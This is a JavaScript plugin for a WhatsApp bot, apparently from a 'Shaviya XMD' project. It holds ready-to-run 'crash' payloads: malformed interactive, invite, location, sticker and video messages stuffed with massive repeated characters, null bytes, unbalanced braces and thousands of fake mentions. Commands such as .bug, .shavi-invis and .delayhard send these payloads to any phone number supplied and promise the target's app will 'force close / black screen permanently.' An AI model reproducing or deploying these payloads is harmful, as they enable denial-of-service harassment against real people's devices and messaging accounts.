const { cmd } = require('../command');
const crypto = require('crypto');
const axios = require('axios');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

// fallback for different Baileys versions
if (!generateWAMessageFromContent) {
    try { generateWAMessageFromContent = require('@adiwajshing/baileys').generateWAMessageFromContent; } catch(e) {}
}

async function getImageBuffer(url) {
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 });
        return Buffer.from(response.data);
    } catch (error) {
        return null;
    }
}

function getTarget(args, from, reply, cmdName) {
    if (!args || !args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX\nExample: .${cmdName} 94712345678`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ==================== COMBO CRASH FUNCTIONS (FIXED) ====================

// 1. VerloadForceDelMsg – malformed interactive + self‑delete
async function verloadForceDelMsg(conn, target) {
    const VaxzyXx = JSON.stringify({
        status: true, criador: "VerloadXApiBug", resultado: {
            type: "md", ws: { _events: { "CB:ib,,dirty": ["Array"] }, _eventsCount: 800000, _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat", config: { version: ["Array"], browser: ["Array"],
            waWebSocketUrl: "wss://web.whatsapp.com/ws/chat", sockCectTimeoutMs: 20000, keepAliveIntervalMs: 30000,
            logger: {}, printQRInTerminal: false, emitOwnEvents: true, defaultQueryTimeoutMs: 60000,
            customUploadHosts: [], retryRequestDelayMs: 250, maxMsgRetryCount: 5, fireInitQueries: true,
            auth: { Object: "authData" }, markOnlineOnsockCect: true, syncFullHistory: true,
            linkPreviewImageThumbnailWidth: 192, transactionOpts: { Object: "transactionOptsData" },
            generateHighQualityLinkPreview: false, options: {}, appStateMacVerification: { Object: "appStateMacData" },
            mobile: true } } } });
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    contextInfo: {
                        expiration: 1, ephemeralSettingTimestamp: 1, entryPointConversionSource: "WhatsApp.com",
                        entryPointConversionApp: "WhatsApp", entryPointConversionDelaySeconds: 1,
                        disappearingMode: { initiatorDeviceJid: target, initiator: "INITIATED_BY_OTHER", trigger: "UNKNOWN_GROUPS" },
                        participant: "0@s.whatsapp.net", remoteJid: target, mentionedJid: [target],
                        questionMessage: { paymentInviteMessage: { serviceType: 1, expiryTimestamp: null } },
                        externalAdReply: { showAdAttribution: false, renderLargerThumbnail: true }
                    },
                    body: { text: "Hi I'm Vaxzy!!" + "ោ៝".repeat(10000) },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(20000),
                        buttons: [
                            { name: "single_select", buttonParamsJson: VaxzyXx + "{".repeat(20000) },
                            { name: "call_permission_request", buttonParamsJson: VaxzyXx + "{".repeat(20000) }
                        ]
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, { participant: { jid: target } });
}

// 2. BlankVVIP – group invite overflow
async function blankVVIP(conn, target) {
    const MSG = {
        groupInviteMessage: {
            groupJid: "120363370626418572@g.us", inviteCode: "Xx".repeat(10000), inviteExpiration: "99999999999",
            groupName: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌" + "ោ៝".repeat(77777),
            caption: "ោ៝".repeat(10000) + "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000) + "._.*_*._>".repeat(5000),
            contentText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000), displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000),
            contextInfo: {
                expiration: 1, ephemeralSettingTimestamp: 1, entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp", entryPointConversionDelaySeconds: 1,
                disappearingMode: { initiatorDeviceJid: target, initiator: "INITIATED_BY_OTHER", trigger: "UNKNOWN_GROUPS" },
                participant: "0@s.whatsapp.net", remoteJid: target, mentionedJid: "0@s.whatsapp.net",
                questionMessage: { paymentInviteMessage: { serviceType: 1, expiryTimestamp: null } },
                externalAdReply: { showAdAttribution: false, renderLargerThumbnail: true }
            },
            body: { text: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌" + "ោ៝".repeat(10450) + "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(32901) + "@1".repeat(50000) },
            footer: { text: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(5000) },
            nativeFlowMessage: { messageParamJson: "{".repeat(25000) },
            buttons: [
                { name: "cta_url", buttonParamJson: "\u0000".repeat(25000) },
                { name: "cta_url", buttonParamJson: JSON.stringify({ displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000) }) },
                { name: "cta_call", buttonParamJson: JSON.stringify({ displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(5000) }) },
                { name: "cta_copy", buttonParamJson: "\u0000".repeat(25000) }
            ]
        }
    };
    await conn.relayMessage(target, MSG, { participant: { jid: target } });
}

// 3. invico1 – newsletter admin invite (extreme name & caption)
async function invico1(conn, target) {
    const msg = {
        newsletterAdminInviteMessage: {
            newsletterJid: "120363321780343299@newsletter",
            newsletterName: "⎋𝐅𝐢̸̷̷̷̋͜͢͜͢͠͡͡𝐍𝐈𝐗͜͢-‣" + "ោ៝".repeat(10000),
            caption: "⎋𝐅𝐢̸̷̷̷̋͜͢͜͢͠͡͡𝐍𝐈𝐗͜͢-‣" + "ោ៝".repeat(10000),
            inviteExpiration: "999999999"
        }
    };
    await conn.relayMessage(target, msg, { participant: { jid: target } });
}

// 4. Uinew – malformed interactive with huge text + location
async function uinew(conn, target) {
    const ameliaMsg = {
        interactiveMessage: {
            body: { text: "AMELIA KILL YOU 👿" + "ꦾ".repeat(80000) + "~@1~".repeat(40000) },
            footer: { text: "AMELIA KILL YOU 👿" + "\u200B".repeat(50000) },
            header: {
                title: "https://amelia_overload" + "ꦾ".repeat(80000) + "~@1~".repeat(40000),
                subtitle: "\u200B", hasMediaAttachment: true,
                locationMessage: { degreesLatitude: 0, degreesLongitude: 0, name: "amelia", address: "" }
            },
            nativeFlowMessage: {
                buttons: [
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "X", id: "amelia6" }) },
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "X", id: "amelia7" }) },
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "X", id: "amelia8" }) },
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "X", id: "amelia9" }) },
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "X", id: "amelia10" }) }
                ]
            }
        }
    };
    await conn.relayMessage(target, ameliaMsg, {});
}

// 5. uiKiller – location message with massive name/address
async function uiKiller(conn, target) {
    await conn.relayMessage(target, {
        locationMessage: {
            degreesLongitude: 0, degreesLatitude: 0,
            name: "⃞⃟⃤⃟⃟𝐀 / 𝐇𝐞𝐥𝐥𝐛𝐨𝐲 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮⃟⃤⃞⃟⃝" + "ི꒦ྀ".repeat(9000),
            url: "https://Amelia." + "ི꒦ྀ".repeat(9000) + ".id",
            address: "⃞⃟⃤⃟⃟𝐀 / 𝐇𝐞𝐥𝐥𝐛𝐨𝐲 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮 ⃟⃤⃞⃟⃝" + "ི꒦ྀ".repeat(9000),
            contextInfo: {
                externalAdReply: {
                    renderLargerThumbnail: true, showAdAttribution: true,
                    body: "Amelia-Hellboy Kill You", title: "ི꒦ྀ".repeat(9000),
                    sourceUrl: "https://Amelia." + "ི꒦ྀ".repeat(9000) + ".id",
                    thumbnailUrl: null,
                    quotedAd: { advertiserName: "ི꒦ྀ".repeat(9000), mediaType: 2, jpegThumbnail: "/9j/4AAKossjsls7920ljspLli", caption: "-( AMA )-" },
                    pleaceKeyHolder: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ABCD1234567" }
                }
            }
        }
    }, {});
}

// 6. frezeui – buttonsMessage with massive content + malformed quoted
async function frezeui(conn, target) {
    await conn.relayMessage(target, {
        viewOnceMessage: {
            message: {
                buttonsMessage: {
                    text: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>",
                    contentText: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>" + "ꦽ".repeat(7000),
                    contextInfo: {
                        forwardingScore: 6, isForwarded: true,
                        urlTrackingMap: {
                            urlTrackingMapElements: [
                                { originalUrl: "https://t.me/vibracoess", unconsentedUsersUrl: "https://t.me/vibracoess", consentedUsersUrl: "https://t.me/vibracoess", cardIndex: 1 },
                                { originalUrl: "https://t.me/vibracoess", unconsentedUsersUrl: "https://t.me/vibracoess", consentedUsersUrl: "https://t.me/vibracoess", cardIndex: 2 }
                            ]
                        },
                        quotedMessage: {
                            interactiveResponseMessage: {
                                body: { text: "🦠", format: "EXTENSIONS_1" },
                                nativeFlowResponseMessage: {
                                    name: "address_message",
                                    paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"xrl\",\"tower_number\":\"relly\",\"city\":\"markzuckerberg\",\"name\":\"fucker\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
                                    version: 3
                                }
                            }
                        }
                    },
                    headerType: 1
                }
            }
        }
    }, {});
}

// 7. ForceXsystem – interactive with 11 buttons, huge params
async function forceXsystem(conn, target) {
    const message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target], isForwarded: true, forwardingScore: 99999999,
                        businessMessageForwardInfo: { businessOwnerJid: target }
                    },
                    body: { text: "Tiada Hidup Dengan Kebahagiaan" + "ꦾ".repeat(35000) },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(15000),
                        buttons: [
                            { name: "single_select", ParamsJson: "{".repeat(15000), version: 3 },
                            { name: "call_permission_request", ParamsJson: "{".repeat(15000), version: 3 },
                            { name: "cta_url", ParamsJson: "{".repeat(15000), version: 3 },
                            { name: "cta_call", ParamsJson: "{".repeat(15000), version: 3 },
                            { name: "cta_copy", ParamsJson: "{".repeat(15000), version: 3 },
                            { name: "cta_reminder", ParamsJson: "{".repeat(15000), version: 3 },
                            { name: "cta_cancel_reminder", ParamsJson: "{".repeat(15000), version: 3 },
                            { name: "address_message", ParamsJson: "{".repeat(15000), version: 3 },
                            { name: "send_location", ParamsJson: "{".repeat(15000), version: 3 },
                            { name: "quick_reply", ParamsJson: "{".repeat(15000), version: 3 },
                            { name: "mpm", ParamsJson: "{".repeat(10000), version: 3 }
                        ]
                    }
                }
            }
        }
    };
    await conn.relayMessage(target, message, { participant: { jid: target } });
}

// 8. BlankUi – image with massive dimensions + buttons
async function blankUi(conn, target) {
    const Amelia = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQObCXPc2AEH2totMBS4GZgFn_RPGdyZKyS2q0907ggtKlAnbqRetIpxhvzlPLeThlEgcDMBeDfdNqfTO8RFyYcfKvKFkBzvj0yos9sJKg?mms3=true",
                            directPath: "/o1/v/t24/f2/m233/AQObCXPc2AEH2totMBS4GZgFn_RPGdyZKyS2q0907ggtKlAnbqRetIpxhvzlPLeThlEgcDMBeDfdNqfTO8RFyYcfKvKFkBzvj0yos9sJKg",
                            mimetype: "image/jpeg", width: 99999999999999, height: 99999999999999,
                            fileLength: 9999999999999, fileSha256: "1KOUrmLddsr6o9UL5rTte7SXgo/AFcsqSz3Go+noF20=",
                            fileEncSha256: "3VSRuGlV95Aj9tHMQcUBgYR6Wherr1sT/FAAKbSUJ9Y=",
                            mediaKeyTimestamp: 1753804634, mediaKey: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
                        }
                    },
                    body: { text: "𝗔𝗠𝗘𝗟𝗜𝗔 𝗞𝗜𝗟𝗟 𝗬𝗢𝗨👿" + "ꦽ".repeat(50000) },
                    contextInfo: {
                        participant: target,
                        mentionedJid: [ "0@s.whatsapp.net", ...Array.from({ length: 700 }, () => "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net") ]
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: JSON.stringify({ status: true }) },
                            { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(50000) }) },
                            { name: "cta_call", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(50000) }) },
                            { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(50000) }) }
                        ],
                        messageParamsJson: "{".repeat(10000)
                    }
                }
            }
        }
    };
    await conn.relayMessage(target, Amelia, { participant: { jid: target } });
}

// ==================== COMBINED .bug COMMAND ====================
async function comboBugCrash(conn, target) {
    await verloadForceDelMsg(conn, target);
    await blankVVIP(conn, target);
    await invico1(conn, target);
    await uinew(conn, target);
    await uiKiller(conn, target);
    await frezeui(conn, target);
    await forceXsystem(conn, target);
    await blankUi(conn, target);
}

// ==================== OTHER COMMANDS (unchanged but kept) ====================
async function invisibleCrash(conn, target) {
    const invisibleText = '\u2060'.repeat(500000) + '\u2063'.repeat(500000);
    const msg = generateWAMessageFromContent(target, {
        interactiveMessage: {
            header: { locationMessage: { degreesLatitude: 9999, degreesLongitude: 9999 }, hasMediaAttachment: true },
            body: { text: invisibleText },
            nativeFlowMessage: { messageParamsJson: '\u0000'.repeat(1000000) },
            contextInfo: { mentionedJid: Array.from({ length: 1000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`) }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

async function delayHardCrash(conn, target) {
    const mentionedList = [ "13135550002@s.whatsapp.net", ...Array.from({ length: 10000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ];
    const stickerMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
                    fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
                    fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
                    mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
                    mimetype: "image/webp", directPath: "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
                    fileLength: { low: 999, high: 0, unsigned: true }, mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                    firstFrameLength: 19904, firstFrameSidecar: "KN4kQ5pyABRAgA==", isAnimated: true,
                    contextInfo: { participant: target, mentionedJid: mentionedList, groupMentions: [], entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp", entryPointConversionDelaySeconds: 467593 },
                    stickerSentTs: { low: -1939477883, high: 555, unsigned: false }, isAvatar: false, isAiSticker: false, isLottie: false
                }
            }
        }
    }, {});
    await conn.relayMessage(target, stickerMsg.message, {});
    const videoMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4", fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
                    fileLength: "1515940", seconds: 14, mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
                    height: 1280, width: 720, fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
                    directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1748276788", contextInfo: { isSampled: true, mentionedJid: mentionedList },
                    forwardedNewsletterMessageInfo: { newsletterJid: "120363321780343299@newsletter", serverMessageId: 1, newsletterName: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬" }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, videoMsg.message, {});
}

// ==================== COMMANDS ====================
cmd({
    pattern: "bug",
    desc: "💀 COMBO CRASH – 8 extreme payloads (permanent freeze / black screen)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "bug");
    if (!target) return;
    await reply(`💀 *SHAVIYA XMD COMBO CRASH* → ${target}\n_Running 8 crash modules..._`);
    try {
        await comboBugCrash(conn, target);
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        if (successImg) {
            await conn.sendMessage(from, { image: successImg, caption: `✅ COMBO CRASH DELIVERED → ${target}\n⚠️ *Target WhatsApp will force close / black screen permanently.*` });
        } else {
            await reply(`✅ COMBO CRASH DELIVERED → ${target}\n⚠️ *Target WhatsApp will force close / black screen permanently.*`);
        }
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

cmd({
    pattern: "shavi-invis",
    desc: "🔮 INVISIBLE CRASH – No visible text, silent freeze",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "shavi-invis");
    if (!target) return;
    await reply(`🔮 *SHAVIYA XMD INVISIBLE CRASH* → ${target}`);
    try {
        await invisibleCrash(conn, target);
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        if (successImg) {
            await conn.sendMessage(from, { image: successImg, caption: `✅ INVISIBLE CRASH SENT → ${target}\n⚠️ *Target will freeze with no visible message.*` });
        } else {
            await reply(`✅ INVISIBLE CRASH SENT → ${target}\n⚠️ *Target will freeze with no visible message.*`);
        }
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

cmd({
    pattern: "delayhard",
    desc: "💀 EXTREME DELAY CRASH – Sticker + Video + 10k mentions",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "delayhard");
    if (!target) return;
    await reply(`💀 *DELAY HARD CRASH* → ${target}\n_Sending sticker + video bombs..._`);
    try {
        await delayHardCrash(conn, target);
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        if (successImg) {
            await conn.sendMessage(from, { image: successImg, caption: `✅ DELAY HARD SENT → ${target}\n⚠️ *Target WhatsApp will freeze / lag severely.*` });
        } else {
            await reply(`✅ DELAY HARD SENT → ${target}\n⚠️ *Target WhatsApp will freeze / lag severely.*`);
        }
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

cmd({
    pattern: "bugmenu",
    desc: "Show crash menu",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply }) => {
    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .bug         : 💀 COMBO CRASH (8 modules – permanent freeze)*\n*│ 📌 .shavi-invis : 🔮 Invisible crash (no text)*\n*│ 📌 .delayhard   : 💀 Extreme delay (sticker+video)*\n*╰──────────────●●►*\n> 💡 *Usᴀɢᴇ:* .bug 947XXXXXXXXX\n> ⚠️ *Extreme power – use only on numbers you own.*`;
    const menuImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/nsa.jpg");
    if (menuImg) {
        await conn.sendMessage(from, { image: menuImg, caption: menuText });
    } else {
        await reply(menuText);
    }
});
